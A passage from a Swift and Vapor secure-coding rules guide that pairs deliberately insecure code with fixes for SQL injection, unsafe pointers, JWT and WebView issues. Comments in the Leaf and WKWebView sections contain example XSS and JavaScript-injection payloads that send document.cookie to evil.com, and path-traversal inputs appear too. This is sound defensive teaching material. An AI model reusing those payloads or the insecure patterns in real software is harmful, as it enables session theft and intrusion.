# 🦅 Swift Security Rules

> **Standard:** Security rules for Swift 5.x and Swift 6.x applications targeting iOS 16+, macOS 13+, and server-side Swift (Vapor 4). Focuses on Swift-language-specific pitfalls distinct from Objective-C and generic mobile security.
> **Sources:** Apple Platform Security Guide, OWASP Mobile Top 10:2024, OWASP MASVS 2.1, Swift Evolution Security Proposals, NVD/CVE Database, GitHub Advisory Database, iOS Security Research (Project Zero, ZecOps), Vapor Security Advisories
> **Version:** 1.0.0
> **Last updated:** March 2026
> **Scope:** Swift 5.x/6.x on Apple platforms and server-side (Vapor 4). Covers language-level security pitfalls unique to Swift: type system bypasses, unsafe APIs, Codable deserialization, Swift concurrency security, @objc bridging risks, and Vapor-specific vulnerabilities. Generic Apple platform security (Keychain, ATS, certificate pinning) is referenced but detailed in code-security-objc.md.

---

## General Instructions

Apply these rules when writing or reviewing Swift code. Swift's type system, ARC, and memory safety eliminate entire classes of C vulnerabilities present in Objective-C — but Swift introduces its own security pitfalls. The most dangerous Swift-specific risks are: **force-unwrapping (`!`) crashing on nil** (DoS vector when nil comes from attacker-controlled input), **`UnsafePointer` / `UnsafeMutableRawPointer` bypassing Swift memory safety** (buffer overflows possible), **`Codable` type confusion and mass assignment** (decoding untrusted JSON into model types that expose sensitive fields), **`@objc` bridging re-introducing Objective-C runtime risks** (method swizzling, KVC), and **Vapor/server-side SQL injection via raw query interpolation**. Swift 6 introduces strict concurrency checking — use it to eliminate data races.

---

## 1. Force-Unwrap (`!`) as Denial-of-Service Vector

**Vulnerability:** Force-unwrapping optionals derived from attacker-controlled data causes immediate process termination on nil. A missing JSON key, malformed URL string, or empty collection is sufficient to crash the application. In a server-side Vapor context this becomes a denial-of-service vector against every request handler that calls `!` on external input.

**References:** CWE-476 (Null Pointer Dereference), CWE-248 (Uncaught Exception)

### Mandatory Rules

- **Never force-unwrap values derived from network responses, user input, or deserialized data** — use `guard let`, `if let`, or `??` with a safe fallback.
- **Use `guard let` with early return or error throw** for missing required fields rather than `!` — this produces a controlled error, not a crash.
- **Replace `try!` with `do { try } catch`** for all fallible operations on untrusted input — `try!` propagates to a fatal error on any failure.
- **Never call `.first!`, `.last!`, or subscript `[index]` on collections sized from external data** — validate count before subscripting.
- **Treat `as!` casts on `Any` values from JSON as crash vectors** — use `as?` with a nil check instead.

```swift
// ❌ INSECURE — crashes if "userId" missing in attacker-controlled JSON
let userId = jsonDict["userId"]! as! String

// ❌ INSECURE — crashes on malformed URL from query parameter
let url = URL(string: req.query["callback"]!)!

// ❌ INSECURE — crashes if records array is empty (e.g., attacker sends empty list)
let first = records.first!

// ✅ SECURE — safe unwrapping with explicit error
guard let userId = jsonDict["userId"] as? String, !userId.isEmpty else {
    throw APIError.missingField("userId")
}

// ✅ SECURE — URL validated before use
guard let rawURL = req.query["callback"],
      let callbackURL = URL(string: rawURL),
      callbackURL.scheme == "https" else {
    throw Abort(.badRequest, reason: "Invalid callback URL")
}

// ✅ SECURE — count checked before access
guard let first = records.first else {
    return []
}
```

---

## 2. UnsafePointer / UnsafeMutableRawPointer — Memory Safety Bypass

**Vulnerability:** Swift's `Unsafe*` pointer family disables the language's memory safety guarantees. `UnsafeMutableRawPointer`, `UnsafeBufferPointer`, and `withUnsafeMutableBytes` allow unchecked memory access. Without explicit bounds validation this enables buffer overflows identical to C. `assumingMemoryBound(to:)` on a pointer of the wrong underlying type produces undefined behavior that can be exploited for type confusion. Pointers escaping a `withUnsafeBytes` closure are dangling and invalid.

**References:** CWE-119 (Improper Restriction of Operations Within a Buffer), CWE-125 (Out-of-Bounds Read), CWE-787 (Out-of-Bounds Write)

### Mandatory Rules

- **Never use `UnsafePointer` variants for data derived from untrusted sources without explicit length validation** — always check `count` against the target buffer capacity first.
- **Always validate buffer lengths before any `memcpy`-equivalent operation** — use `min(source.count, destination.count)` as the copy length.
- **Prefer `Data`, `[UInt8]`, or Swift collection APIs** over raw pointer arithmetic for all data manipulation.
- **Never escape an `UnsafePointer` outside the closure** passed to `withUnsafeBytes` / `withUnsafeMutableBytes` — the pointer is invalidated when the closure returns.
- **Never call `assumingMemoryBound(to:)` unless you can prove the underlying type is correct** — use typed `withUnsafeBytes { $0.load(as: T.self) }` instead.

```swift
// ❌ INSECURE — no bounds check; buffer overflow if networkData.count > 1024
var buffer = [UInt8](repeating: 0, count: 1024)
networkData.withUnsafeBytes { ptr in
    memcpy(&buffer, ptr.baseAddress!, networkData.count)  // overflows stack if count > 1024
}

// ❌ INSECURE — pointer escaped from closure; dangling after closure returns
var escapedPtr: UnsafeRawPointer?
networkData.withUnsafeBytes { ptr in
    escapedPtr = ptr.baseAddress  // use-after-free
}

// ✅ SECURE — bounds-checked copy using min()
let copyCount = min(networkData.count, buffer.count)
networkData.withUnsafeBytes { ptr in
    guard let base = ptr.baseAddress else { return }
    memcpy(&buffer, base, copyCount)
}

// ✅ SECURE — typed load without assumingMemoryBound
let value: UInt32 = networkData.withUnsafeBytes { $0.load(as: UInt32.self) }
```

---

## 3. Codable Deserialization — Mass Assignment and Type Confusion

**Vulnerability:** `Decodable` decodes all properties that appear in incoming JSON into the Swift model. If a privileged field (`isAdmin`, `role`, `balance`) exists on the decoded type, an attacker who controls the request body can set it directly. `AnyCodable` / `[String: Any]` patterns introduce `as!` casts that crash on type mismatch. The `userInfo` dictionary passed to `JSONDecoder` can be read by custom `init(from:)` implementations — an attacker cannot inject into it, but passing security context through it creates fragile coupling.

**References:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), CWE-502 (Deserialization of Untrusted Data)

### Mandatory Rules

- **Define separate DTOs for external input** — never decode directly into a domain model that contains privileged fields.
- **Explicitly list `CodingKeys`** for all input DTOs — prevents accidentally decoding newly-added sensitive fields.
- **Validate decoded values after decoding** — `Decodable` checks types but not semantic ranges, formats, or business constraints.
- **Never trust decoded enum raw values** from external input without explicit allowlist validation after decode.
- **Avoid `AnyCodable` / `[String: Any]` decode patterns with `as!` casts** — use `as?` with nil handling or define typed structs.

```swift
// ❌ INSECURE — attacker can POST {"name":"Eve","isAdmin":true,"balance":99999}
struct User: Codable {
    var id: UUID
    var name: String
    var isAdmin: Bool      // attacker sets this via request body
    var balance: Decimal   // attacker sets this via request body
}
let user = try JSONDecoder().decode(User.self, from: requestBody)

// ❌ INSECURE — as! cast crashes if server changes response shape
let dict = try JSONDecoder().decode([String: AnyCodable].self, from: data)
let count = dict["count"]!.value as! Int

// ✅ SECURE — input DTO: only safe fields exposed
struct UserRegistrationDTO: Decodable {
    let name: String
    let email: String

    enum CodingKeys: String, CodingKey {
        case name, email  // isAdmin / balance intentionally absent
    }
}

// ✅ SECURE — privileged fields set by business logic only
let dto = try JSONDecoder().decode(UserRegistrationDTO.self, from: requestBody)
let user = User(
    id: UUID(),
    name: dto.name,
    email: dto.email,
    isAdmin: false,     // always server-assigned
    balance: Decimal(0) // always server-assigned
)
```

---

## 4. SQL Injection in Vapor / Server-Side Swift

**Vulnerability:** SQLKit's `db.raw()` accepts a Swift string interpolation literal. The `\(value)` interpolation in a raw query concatenates the value as a literal string — it does NOT bind it as a parameter. This is syntactically identical to safe parameterized binding (`\(bind: value)`), making it trivially easy to write injection-vulnerable code that looks correct. Fluent ORM query builders are always parameterized and should be preferred.

**References:** CWE-89 (SQL Injection)

### Mandatory Rules

- **Use Fluent ORM query builders** (`.filter(\.$field == value)`) for all standard queries — always parameterized.
- **In SQLKit raw queries, use `\(bind: value)` — never `\(value)`** — the difference is one word but the security impact is total.
- **Never interpolate table names, column names, or ORDER BY values from user input** — use an allowlist of permitted identifiers and inject via `SQLIdentifier`.
- **Validate enum-typed URL parameters before SQL** — do not assume routing constraints provide SQL safety.
- **Audit `db.raw(` occurrences** in code review — every call site must use `\(bind:)` for all user-supplied values.

```swift
// ❌ INSECURE — \(email) is string interpolation: SQL injection
let users = try await db
    .raw("SELECT * FROM users WHERE email = '\(email)'")
    .all(decoding: User.self)

// ❌ INSECURE — table name from user input: always injectable
let table = req.query["table"] ?? "users"
let rows = try await db.raw("SELECT * FROM \(table) LIMIT 10").all()

// ✅ SECURE — \(bind: email) creates a parameterized binding
let users = try await db
    .raw("SELECT * FROM users WHERE email = \(bind: email)")
    .all(decoding: User.self)

// ✅ SECURE — Fluent ORM (always parameterized, never injectable)
let users = try await User.query(on: db)
    .filter(\.$email == email)
    .all()

// ✅ SECURE — column name from allowlist via SQLIdentifier
let allowedColumns = ["created_at", "name", "email"]
guard let col = req.query["sort"], allowedColumns.contains(col) else {
    throw Abort(.badRequest)
}
let rows = try await db.raw("SELECT * FROM users ORDER BY \(SQLIdentifier(col))").all()
```

---

## 5. Server-Side Template Injection (Leaf in Vapor)

**Vulnerability:** Leaf's default `#(variable)` tag HTML-escapes output — this is safe. The risk is from explicit use of `#unsafeHTML(variable)` which outputs raw HTML, enabling stored XSS. A secondary risk is template path traversal: if the template name is derived from a request parameter, an attacker can reference `../../etc/passwd` or templates containing sensitive configuration.

**References:** CWE-79 (Cross-Site Scripting), CWE-22 (Path Traversal)

### Mandatory Rules

- **Never use `#unsafeHTML()` with user-controlled content** — it opts out of all escaping.
- **Validate and allowlist Leaf template names** — never derive a template path from request parameters without an explicit allowlist check.
- **Sanitize rich text server-side before injecting into Leaf context** — use `SwiftSoup` or equivalent for HTML stripping.
- **Use typed `LeafData` values** — avoids accidental raw string injection through untyped context dictionaries.

```swift
// ❌ INSECURE — XSS: bio = "<script>document.location='https://evil.com?c='+document.cookie</script>"
let context = ["userBio": LeafData.string(user.bio)]
// In template: #unsafeHTML(userBio)   ← raw XSS output

// ❌ INSECURE — template path from user input: path traversal
let page = req.parameters.get("page") ?? "home"
return req.view.render(page)   // attacker sends page = "../../../../etc/passwd"

// ✅ SECURE — default #(userBio) is HTML-escaped; safe for untrusted content
// In template: #(userBio)

// ✅ SECURE — allowlist template names
let allowed: Set<String> = ["home", "about", "contact", "faq"]
guard let page = req.parameters.get("page"), allowed.contains(page) else {
    throw Abort(.badRequest, reason: "Invalid page")
}
return req.view.render(page)
```

---

## 6. @objc Bridging — Re-introducing Objective-C Runtime Risks

**Vulnerability:** Marking Swift methods as `@objc dynamic` makes them swizzlable via the Objective-C runtime (`method_exchangeImplementations`). Security-critical methods like `isAuthenticated()` can be replaced at runtime by malicious code or a compromised dylib. Swift properties marked `@objc` are accessible via KVC (`setValue(_:forKeyPath:)`) — if `forKeyPath:` is user-controlled, this is equivalent to ObjC KVC injection. `NSObject` inheritance expands the attack surface to all KVC and KVO mechanisms.

**References:** CWE-284 (Improper Access Control)

### Mandatory Rules

- **Never mark security-critical methods as `@objc dynamic`** — authentication, authorization, and cryptography functions must not be swizzlable.
- **Declare security-sensitive classes as `final`** — prevents subclassing and narrows the swizzling surface.
- **Avoid `NSObject` inheritance for pure Swift types** — eliminates KVC and KVO attack surface entirely.
- **Never pass user-controlled strings to `setValue(_:forKeyPath:)`** — validate and allowlist any key paths used with KVC.
- **Never use `perform(_:with:)` with selectors derived from external input** — selector injection allows calling arbitrary methods.

```swift
// ❌ INSECURE — dynamic + @objc: swizzlable by any loaded dylib
class AuthManager: NSObject {
    @objc dynamic func isAuthenticated() -> Bool {
        return validateToken()
    }
}

// ❌ INSECURE — KVC with user-controlled key: attacker sets arbitrary properties
let key = req.query["field"] ?? "name"
userObject.setValue(newValue, forKeyPath: key)  // sets isAdmin, balance, etc.

// ✅ SECURE — final class, not @objc, not dynamic: cannot be subclassed or swizzled
final class AuthManager {
    func isAuthenticated() -> Bool {  // pure Swift dispatch; not visible to ObjC runtime
        return validateToken()
    }
}

// ✅ SECURE — KVC with explicit allowlist
let allowedKeys = ["displayName", "preferredLanguage"]
guard let key = req.query["field"], allowedKeys.contains(key) else {
    throw Abort(.badRequest)
}
userObject.setValue(newValue, forKeyPath: key)
```

---

## 7. Cryptography Misuse — CryptoKit and CommonCrypto

**Vulnerability:** CryptoKit provides a safe API but misuse patterns are common. Hashing passwords with `SHA256` is fast and unsalted — trivially brute-forceable with GPU. Reusing a GCM nonce with the same key breaks both confidentiality and authenticity (nonce reuse in GCM recovers the authentication key). Deriving a symmetric key directly from a password string (`SymmetricKey(data: Data(password.utf8))`) skips key stretching — the key space collapses to the password space. `Int.random(in:)` and `UUID()` use non-cryptographic sources and must never be used for secrets or nonces.

**References:** CWE-327 (Use of Broken or Risky Cryptographic Algorithm), CWE-338 (Use of Cryptographically Weak PRNG), CWE-916 (Use of Password Hash With Insufficient Computational Effort)

### Mandatory Rules

- **Never hash passwords with SHA-256 or any fast hash** — use PBKDF2 (`CCKeyDerivationPBKDF`) with minimum 100,000 iterations client-side, or send to a server using bcrypt/Argon2id.
- **Generate nonces with `AES.GCM.Nonce()` for every encryption operation** — never reuse a nonce with the same key.
- **Derive symmetric keys from passwords with PBKDF2** — never `SymmetricKey(data: Data(password.utf8))`.
- **Use `SecRandomCopyBytes` for security token generation** — never `Int.random`, `arc4random`, or `UUID().uuidString`.
- **Store `SymmetricKey` and private keys in the Keychain** — never hardcode in source or embed in the binary.

```swift
import CryptoKit
import CommonCrypto

// ❌ INSECURE — SHA256 of password: no salt, fast GPU brute-force feasible
let hash = SHA256.hash(data: password.data(using: .utf8)!)

// ❌ INSECURE — fixed nonce: GCM nonce reuse allows key recovery
let fixedNonce = try! AES.GCM.Nonce(data: Data(repeating: 0, count: 12))
let sealed = try! AES.GCM.seal(plaintext, using: key, nonce: fixedNonce)

// ❌ INSECURE — key derived directly from password bytes: no stretching
let weakKey = SymmetricKey(data: Data(password.utf8))

// ❌ INSECURE — UUID as secret token: not cryptographically random
let token = UUID().uuidString

// ✅ SECURE — random nonce generated per encryption
let nonce = AES.GCM.Nonce()  // cryptographically random 96-bit nonce
let sealed = try AES.GCM.seal(plaintext, using: key, nonce: nonce)

// ✅ SECURE — PBKDF2 key derivation from password
func deriveKey(from password: String, salt: Data) -> SymmetricKey {
    var derivedKey = [UInt8](repeating: 0, count: 32)
    let passwordData = Array(password.utf8)
    let saltBytes = Array(salt)
    CCKeyDerivationPBKDF(
        CCPBKDFAlgorithm(kCCPBKDF2),
        passwordData, passwordData.count,
        saltBytes, saltBytes.count,
        CCPseudoRandomAlgorithm(kCCPRFHmacAlgSHA256),
        100_000,
        &derivedKey, derivedKey.count
    )
    return SymmetricKey(data: Data(derivedKey))
}

// ✅ SECURE — cryptographically secure token
func generateToken(length: Int = 32) -> String {
    var bytes = [UInt8](repeating: 0, count: length)
    SecRandomCopyBytes(kSecRandomDefault, length, &bytes)
    return Data(bytes).base64EncodedString()
}
```

---

## 8. Insecure Data Storage — Swift-Specific

**Vulnerability:** `UserDefaults` stores data as a plaintext property list at a predictable path accessible to any process with the same App Group entitlement. On non-encrypted backups (iTunes, `allowBackup`), this file is extractable. `@AppStorage` is syntactic sugar over `UserDefaults` — same risk. `@SceneStorage` persists UI state to unencrypted files. `NSUbiquitousKeyValueStore` syncs to iCloud without end-to-end encryption for all data classes. Embedding secrets in `Info.plist` or asset catalogs makes them extractable with standard tools.

**References:** OWASP MASVS-STORAGE-1

### Mandatory Rules

- **Store all authentication tokens, API keys, and private keys in the Keychain** with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`.
- **Never store secrets in `UserDefaults`, `@AppStorage`, `@SceneStorage`, or `NSUbiquitousKeyValueStore`.**
- **Create sensitive files with `NSFileProtectionComplete`** — this ties decryption to device unlock.
- **Audit `Info.plist`** at build time — any API key or secret must be rejected from the pipeline.
- **Never use `@AppStorage` for security-relevant values** — it is backed by `UserDefaults` and has no encryption.

```swift
// ❌ INSECURE — UserDefaults: plaintext plist on disk
UserDefaults.standard.set(authToken, forKey: "authToken")

// ❌ INSECURE — @AppStorage is UserDefaults under the hood
@AppStorage("authToken") var authToken: String = ""

// ❌ INSECURE — file written without protection class
let url = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    .appendingPathComponent("session.dat")
try data.write(to: url)  // no file protection

// ✅ SECURE — Keychain storage with device-only restriction
func storeToken(_ token: String, account: String) throws {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrService as String: "com.myapp.auth",
        kSecAttrAccount as String: account,
        kSecValueData as String: token.data(using: .utf8)!,
        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
    ]
    SecItemDelete(query as CFDictionary)  // remove existing before add
    let status = SecItemAdd(query as CFDictionary, nil)
    guard status == errSecSuccess else { throw KeychainError.saveFailed(status) }
}

// ✅ SECURE — file written with Complete protection class
let attrs: [FileAttributeKey: Any] = [.protectionKey: FileProtectionType.complete]
FileManager.default.createFile(atPath: sensitiveURL.path, contents: data, attributes: attrs)
```

---

## 9. Swift Concurrency — Data Races and Actor Isolation Bypass

**Vulnerability:** Pre-Swift 6, `class` types with shared mutable state accessed from multiple concurrent `Task` instances produce data races. These are undefined behavior — they can corrupt in-memory state, crash, or produce incorrect security decisions (e.g., a cached `isAuthenticated` flag flipping to the wrong value mid-check). `nonisolated(unsafe)` explicitly opts out of actor isolation for mutable state. `Task.detached` creates a new task outside all actor contexts — accessing actor-isolated state from a detached task requires explicit `await` but older patterns using captured references may not.

**References:** CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization)

### Mandatory Rules

- **Enable Swift 6 strict concurrency checking** (`SWIFT_STRICT_CONCURRENCY = complete` in build settings) — makes data races compile-time errors.
- **Model all shared mutable state as `actor`** — never use `class` with manual `DispatchQueue` or `NSLock` for new code.
- **Never use `nonisolated(unsafe)` on security-critical state** — this silences concurrency checks while leaving races possible.
- **Ensure `withUnsafeContinuation` / `withCheckedContinuation` resumes exactly once** — double-resume is undefined behavior; zero-resume is a deadlock and memory leak.
- **For Vapor route handlers, prefer `async` functions with actor-isolated shared state** — do not use global `var` for per-request or shared state.

```swift
// ❌ INSECURE — data race: sessionCache accessed concurrently from multiple tasks
class SessionManager {
    var sessionCache: [String: Session] = [:]  // not thread-safe

    func getSession(id: String) -> Session? {
        return sessionCache[id]  // data race if called concurrently
    }

    func store(_ session: Session, id: String) {
        sessionCache[id] = session  // data race
    }
}

// ❌ INSECURE — nonisolated(unsafe) disables Swift 6 race detection
actor AuthState {
    nonisolated(unsafe) var currentUser: User?  // races possible despite actor
}

// ✅ SECURE — actor serializes all access automatically
actor SessionManager {
    private var sessionCache: [String: Session] = [:]

    func getSession(id: String) -> Session? {
        return sessionCache[id]
    }

    func store(_ session: Session, id: String) {
        sessionCache[id] = session
    }

    func invalidate(id: String) {
        sessionCache.removeValue(forKey: id)
    }
}

// ✅ SECURE — checked continuation resumes exactly once
func fetchWithTimeout() async throws -> Data {
    try await withCheckedThrowingContinuation { continuation in
        networkClient.fetch { result in
            switch result {
            case .success(let data): continuation.resume(returning: data)
            case .failure(let error): continuation.resume(throwing: error)
            // No other code paths — exactly one resume guaranteed
            }
        }
    }
}
```

---

## 10. Path Traversal — FileManager with User-Controlled Paths

**Vulnerability:** Naive concatenation of user-supplied filenames to a base directory path allows `../` sequences to escape the intended directory. `URL(fileURLWithPath:)` does not resolve or reject traversal sequences — it stores the path literally. `URL.standardized` normalizes `.` and `..` components; `URL.resolvingSymlinksInPath()` follows symlinks. Both must be applied and the result must be prefix-checked against the base directory to confirm confinement.

**References:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

### Mandatory Rules

- **Never concatenate user input directly to file paths** — use `URL.appendingPathComponent(_:)` which sanitizes the component, and then validate.
- **Canonicalize with `.standardized.resolvingSymlinksInPath()`** and verify the result's `.path` has the base directory's `.path` as a prefix.
- **Validate file extensions against an allowlist** before any file read or write operation.
- **For Vapor static file serving**, use the built-in `FileMiddleware` rather than manually constructing paths from request parameters.

```swift
// ❌ INSECURE — path traversal: userFilename = "../../etc/passwd"
let documentsDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
let path = documentsDir.path + "/" + userFilename
let data = FileManager.default.contents(atPath: path)

// ❌ INSECURE — appendingPathComponent without validation
let fileURL = documentsDir.appendingPathComponent(userFilename)
// userFilename = "../Library/Preferences/com.myapp.plist" still escapes

// ✅ SECURE — canonicalize then prefix-check
func safeFileURL(baseURL: URL, userFilename: String) throws -> URL {
    let candidateURL = baseURL
        .appendingPathComponent(userFilename)
        .standardized
        .resolvingSymlinksInPath()
    let canonicalBase = baseURL.standardized.resolvingSymlinksInPath()

    guard candidateURL.path.hasPrefix(canonicalBase.path + "/") ||
          candidateURL.path == canonicalBase.path else {
        throw SecurityError.pathTraversal
    }

    let allowed = ["png", "jpg", "pdf"]
    guard let ext = candidateURL.pathExtension.lowercased() as String?,
          allowed.contains(ext) else {
        throw SecurityError.invalidFileType
    }
    return candidateURL
}
```

---

## 11. Regular Expression ReDoS

**Vulnerability:** Both `NSRegularExpression` and Swift 5.7+ `Regex` can catastrophically backtrack on patterns with nested quantifiers (`(a+)+`, `(a*)*`, `([a-z]+\s?)+`). A crafted input causes exponential evaluation time — a 30-character string can hang the process for minutes. In server-side Vapor route handlers, a single request can pin a worker thread indefinitely, blocking other requests.

**References:** CWE-1333 (Inefficient Regular Expression Complexity)

### Mandatory Rules

- **Limit input length before applying complex regex** — enforce a maximum (e.g., 1,000 characters) at the handler level.
- **Avoid nested quantifiers on patterns applied to user input** — `(a+)+` is catastrophic; `a+` is linear.
- **Prefer Swift 5.7+ `Regex` literals with possessive quantifiers** where the pattern requires repetition.
- **For email and URL validation, use `NSDataDetector` or purpose-built validators** rather than hand-rolled regex.

```swift
// ❌ INSECURE — ReDoS: input "aaaaaaaaaaaaaaaaaaaaaaaab" causes exponential backtracking
let pattern = try NSRegularExpression(pattern: "^(a+)+$")
let range = NSRange(userInput.startIndex..., in: userInput)
let _ = pattern.firstMatch(in: userInput, range: range)  // hangs on crafted input

// ❌ INSECURE — no input length limit before expensive pattern
func validateEmail(_ email: String) -> Bool {
    let pattern = try! NSRegularExpression(
        pattern: "^[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$"
    )
    return pattern.firstMatch(in: email, range: NSRange(email.startIndex..., in: email)) != nil
}

// ✅ SECURE — length limit + linear-time pattern (no nested quantifiers)
func validateUsername(_ input: String) throws -> Bool {
    guard input.count <= 64 else { throw ValidationError.inputTooLong }
    let pattern = try NSRegularExpression(pattern: "^[a-zA-Z0-9_]{3,64}$")
    return pattern.firstMatch(in: input, range: NSRange(input.startIndex..., in: input)) != nil
}

// ✅ SECURE — Swift 5.7+ Regex literal (compiler-verified, linear on simple patterns)
guard userInput.count <= 1000 else { throw ValidationError.inputTooLong }
let isValid = try /^[a-z0-9]+$/.wholeMatch(in: userInput) != nil
```

---

## 12. Vapor Authentication and JWT

**Vulnerability:** Vapor's `jwt-kit` requires implementing `JWTPayload.verify(using:)` — an empty or incomplete implementation silently skips all claim validation. Missing `exp` validation means tokens never expire; missing `iss` or `aud` validation allows tokens from foreign systems to be accepted. HS256 with a weak or hardcoded secret is susceptible to offline brute-force. Session cookies without `httpOnly` and `secure` flags are accessible to JavaScript and sent over HTTP.

**References:** CWE-347 (Improper Verification of Cryptographic Signature), CWE-798 (Use of Hard-coded Credentials)

### Mandatory Rules

- **Always implement `verify(using:)` with explicit `exp`, `iss`, and `aud` checks** — a no-op implementation is the most common JWT vulnerability in Vapor.
- **Use RS256 or ES256 (asymmetric) for JWTs issued to clients** — HS256 shared secrets must be kept server-side only.
- **Load signing keys from environment variables or a secrets manager** — never hardcode in source.
- **Configure session cookies with `isHTTPOnly: true`, `isSecure: true`, and `sameSite: .lax` or `.strict`.**
- **Reject tokens with `alg: none`** — `jwt-kit` does not accept `none` by default, but verify no custom signer is registered for it.

```swift
// ❌ INSECURE — empty verify: no exp, iss, or aud validation; tokens never expire
struct UserPayload: JWTPayload {
    var sub: SubjectClaim
    var role: String
    func verify(using signer: JWTSigner) throws {
        // nothing — every token is accepted regardless of expiry or issuer
    }
}
// ❌ INSECURE — hardcoded HS256 secret in source
app.jwt.signers.use(.hs256(key: "super_secret_jwt_key_123"))

// ✅ SECURE — full claim validation
struct UserPayload: JWTPayload {
    var sub: SubjectClaim
    var exp: ExpirationClaim
    var iss: IssuerClaim
    var aud: AudienceClaim
    var role: String

    func verify(using signer: JWTSigner) throws {
        try exp.verifyNotExpired()
        guard iss.value == "https://api.myapp.com" else {
            throw JWTError.claimVerificationFailure(name: "iss", reason: "invalid issuer")
        }
        guard aud.value.contains("https://myapp.com") else {
            throw JWTError.claimVerificationFailure(name: "aud", reason: "invalid audience")
        }
    }
}

// ✅ SECURE — signing key from environment
guard let jwtSecret = Environment.get("JWT_SECRET"), jwtSecret.count >= 32 else {
    fatalError("JWT_SECRET must be set and at least 32 characters")
}
app.jwt.signers.use(.hs256(key: jwtSecret))

// ✅ SECURE — session cookie configuration
app.sessions.configuration = .init(cookieName: "vapor_session") { sessionID in
    return HTTPCookies.Value(
        string: sessionID,
        expires: Date(timeIntervalSinceNow: 3600),
        isHTTPOnly: true,
        isSecure: true,
        sameSite: .lax
    )
}
```

---

## 13. Deep Links, Universal Links, and URL Scheme Validation

**Vulnerability:** Custom URL schemes (`myapp://`) can be registered by any app — malicious apps can intercept scheme-based deep links. Universal Links (`https://`) are AASA-verified but the URL's query parameters still carry attacker-controlled values. Open redirect occurs when the app navigates a WKWebView or calls `UIApplication.shared.open()` with a URL built from unvalidated deep link parameters. This enables phishing (opening attacker-controlled web pages in the app's trusted context) and cookie/session theft if the WebView shares state.

**References:** CWE-601 (URL Redirection to Untrusted Site), OWASP Mobile Top 10 M1

### Mandatory Rules

- **Use Universal Links (HTTPS + `apple-app-site-association`)** for sensitive flows — not custom URL schemes.
- **Validate all deep link URLs: scheme must be `https`, host must be in an allowlist** before acting on the URL or opening it.
- **Never navigate a WKWebView to a URL built from unvalidated deep link parameters.**
- **In `onOpenURL` / `application(_:open:options:)`, parse and validate before any action** — treat incoming URLs as untrusted input.

```swift
// ❌ INSECURE — open redirect: redirect param can point to any URL
.onOpenURL { url in
    let components = URLComponents(url: url, resolvingAgainstBaseURL: false)
    if let redirect = components?.queryItems?.first(where: { $0.name == "redirect" })?.value,
       let target = URL(string: redirect) {
        UIApplication.shared.open(target)  // opens attacker.com in Safari
    }
}

// ❌ INSECURE — WKWebView navigates to user-controlled URL
func handleDeepLink(_ url: URL) {
    let dest = url.queryParameter("page") ?? "home"
    webView.load(URLRequest(url: URL(string: "https://myapp.com/\(dest)")!))
}

// ✅ SECURE — allowlist host before opening external URL
.onOpenURL { url in
    guard
        let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
        let redirectString = components.queryItems?.first(where: { $0.name == "redirect" })?.value,
        let redirectURL = URL(string: redirectString),
        redirectURL.scheme == "https",
        ["myapp.com", "www.myapp.com", "support.myapp.com"].contains(redirectURL.host)
    else { return }
    UIApplication.shared.open(redirectURL)
}
```

---

## 14. WKWebView Security

**Vulnerability:** `WKUserContentController` message handlers receive `Any` from JavaScript — arbitrary attacker-controlled JavaScript can call the handler with unexpected types, causing `as!` crashes or logic errors. `evaluateJavaScript(_:)` with string interpolation is JavaScript injection — user content containing `'); alert(1); //` breaks the intended call. `loadHTMLString(_:baseURL:)` with user-supplied HTML enables stored XSS in the WebView context, which shares cookies and localStorage with other pages on the same origin if `baseURL` is non-nil.

**References:** CWE-79 (Cross-Site Scripting)

### Mandatory Rules

- **Validate all messages received in `userContentController(_:didReceive:)`** — `message.body` is `Any`; cast with `as?` and validate structure before acting.
- **Never call `evaluateJavaScript(_:)` with user-controlled string content** — use `callAsyncJavaScript(_:arguments:in:in:completionHandler:)` with a typed arguments dictionary.
- **Sanitize or reject HTML before `loadHTMLString`** — or use `WKWebView.loadFileURL` for trusted local content only.
- **Set `allowsContentJavaScript = false`** for WebViews that display static or document content without interactive scripts.
- **Set `WKWebViewConfiguration.limitsNavigationsToAppBoundDomains = true`** for WebViews that should not navigate outside the app.

```swift
// ❌ INSECURE — JavaScript injection via evaluateJavaScript with string interpolation
let js = "showUserMessage('\(userInput)')"  // userInput = "'); fetch('https://evil.com?c='+document.cookie); //"
webView.evaluateJavaScript(js, completionHandler: nil)

// ❌ INSECURE — as! crash on unexpected message body type
func userContentController(_ controller: WKUserContentController,
                            didReceive message: WKScriptMessage) {
    let data = message.body as! [String: String]  // crashes if JS sends wrong type
    processCommand(data["action"]!)
}

// ✅ SECURE — callAsyncJavaScript with typed arguments dict (no injection possible)
webView.callAsyncJavaScript(
    "showUserMessage(message)",
    arguments: ["message": userInput],  // properly escaped by the runtime
    in: nil,
    in: .page,
    completionHandler: nil
)

// ✅ SECURE — validate message body before acting
func userContentController(_ controller: WKUserContentController,
                            didReceive message: WKScriptMessage) {
    guard let body = message.body as? [String: Any],
          let action = body["action"] as? String,
          ["navigate", "share", "close"].contains(action) else { return }
    handleAction(action, params: body)
}
```

---

## 15. Logging Sensitive Data (os_log / Logger)

**Vulnerability:** Swift's `Logger` (unified logging) redacts string interpolations by default with `privacy: .private` — they appear as `<private>` in Console on non-development devices. However, explicitly using `privacy: .public` opts out of all redaction. `print()` is never filtered — it appears in Xcode console and is readable via `idevicesyslog` on any device, and via `Console.app` on jailbroken devices. `NSLog` called from Swift is always public.

**References:** CWE-532 (Insertion of Sensitive Information into Log File)

### Mandatory Rules

- **Use `Logger` (os_log) with `privacy: .private` (the default) for all security-sensitive values** — tokens, passwords, PII, device identifiers.
- **Never use `print()` or `NSLog` in production code for user data or security values** — gate any debug prints behind `#if DEBUG`.
- **Never annotate sensitive fields with `privacy: .public`** — use `.private` or `.sensitive` (iOS 17+) for fields that contain identifying or secret data.
- **Audit log statements at code review** — `privacy: .public` on sensitive fields must be rejected.

```swift
import OSLog

let logger = Logger(subsystem: "com.myapp.auth", category: "session")

// ❌ INSECURE — print() always visible via idevicesyslog or Console
print("User token: \(authToken)")
